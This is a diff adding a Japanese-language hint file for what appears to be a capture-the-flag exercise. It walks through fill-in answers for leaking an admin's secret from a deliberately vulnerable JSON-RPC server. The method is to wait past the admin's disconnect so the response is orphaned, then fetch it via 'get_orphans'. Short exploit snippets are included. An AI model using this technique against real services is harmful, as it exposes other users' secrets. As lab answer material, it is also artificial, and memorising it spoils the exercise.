@@ -1,0 +1,65 @@
+================================================================================
+ヒント2: 具体的なテクニック
+================================================================================
+
+【穴埋めの答え】
+
+1. wait_time の値
+   ────────────────────────────────────────
+   admin は 2000ms (2秒) の遅延で get_secret を呼ぶ
+   admin は 300ms で待ちきれずに切断する
+
+   → サーバーは 2000ms 後にレスポンスを返そうとする
+   → 既に admin は切断している
+   → 送信失敗 → orphan_responses に保存
+
+   wait_time は 2秒以上に設定する
+   例: wait_time = 2.5  # 2.5秒
+
+
+2. orphan を取得するメソッド
+   ────────────────────────────────────────
+   vulnerable_server.py の _handle_get_orphans を見ると：
+
+     def _handle_get_orphans(self, req_id: Any):
+         self._send_result(req_id, {
+             "orphans": orphan_responses.copy(),
+             "count": len(orphan_responses)
+         })
+
+   メソッド名は "get_orphans"
+   例: resp = attacker.request("get_orphans", {})
+
+
+3. orphans リストの取得
+   ────────────────────────────────────────
+   resp = {"result": {"orphans": [...], "count": N}}
+
+   なので：
+   orphans = resp.get("result", {}).get("orphans", [])
+
+
+4. FLAG の抽出
+   ────────────────────────────────────────
+   各 orphan は JSON-RPC レスポンスの形式：
+   {
+       "jsonrpc": "2.0",
+       "id": ...,
+       "result": {
+           "user": "admin",
+           "secret": "FLAG{...}"
+       }
+   }
+
+   なので：
+   for orphan in orphans:
+       result = orphan.get("result", {})
+       if result.get("user") == "admin":
+           flag = result.get("secret")
+
+
+【それでも動かない場合】
+
+- サーバーは起動していますか？
+- タイミングが難しい場合は wait_time を少し長くしてみてください
+- solution.py を見て答え合わせしてください
